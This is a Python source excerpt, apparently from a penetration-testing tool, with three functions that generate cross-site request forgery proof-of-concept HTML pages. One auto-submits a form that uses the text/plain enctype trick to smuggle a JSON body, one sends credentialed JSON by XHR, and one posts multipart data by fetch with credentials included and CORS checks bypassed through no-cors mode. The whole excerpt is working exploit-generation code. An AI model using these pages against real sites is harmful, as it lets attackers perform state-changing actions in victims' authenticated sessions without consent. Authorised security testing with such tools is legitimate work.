# ----------------------------------------------------------------
# P6: JSON via text/plain enctype trick
# ----------------------------------------------------------------
def gen_json_textplain(action: str, params: dict) -> str:
    json_str = json.dumps(params)
    key_part = json_str[:-1]
    val_part = "}"
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF JSON PoC</title></head>
<body>
  <script>history.pushState('', '', '/');</script>
  <form id="csrfform" action="{_esc_attr(action)}" method="POST" enctype="text/plain">
      <input type="hidden" name='{_esc_attr(key_part)}' value='{_esc_attr(val_part)}' />
      <input type="submit" value="Submit" />
  </form>
  <script>document.getElementById('csrfform').submit();</script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-json-textplain.html", html)


# ----------------------------------------------------------------
# P7: JSON via XHR (application/json, may trigger CORS preflight)
# ----------------------------------------------------------------
def gen_json_xhr(action: str, params: dict) -> str:
    payload = json.dumps(params)
    esc_action = _esc_js_string(action)
    esc_payload = _esc_js_string(payload, quote="'")
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF JSON XHR PoC</title></head>
<body>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("POST", "{esc_action}", true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send('{esc_payload}');
  </script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-json-xhr.html", html)


# ----------------------------------------------------------------
# P8: Multipart POST via fetch
# ----------------------------------------------------------------
def gen_multipart_fetch(action: str, params: dict) -> str:
    lines = []
    sq = "'"
    for k, v in params.items():
        ek = _esc_js_string(k, quote=sq)
        ev = _esc_js_string(v, quote=sq)
        lines.append(f"    fd.append('{ek}', '{ev}');")
    append_lines = "\n".join(lines)
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF Multipart PoC</title></head>
<body>
  <script>
    var fd = new FormData();
{append_lines}
    fetch("{_esc_js_string(action)}", {{
      method: "POST",
      body: fd,
      credentials: "include",
      mode: "no-cors"
    }});
  </script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-multipart-fetch.html", html)


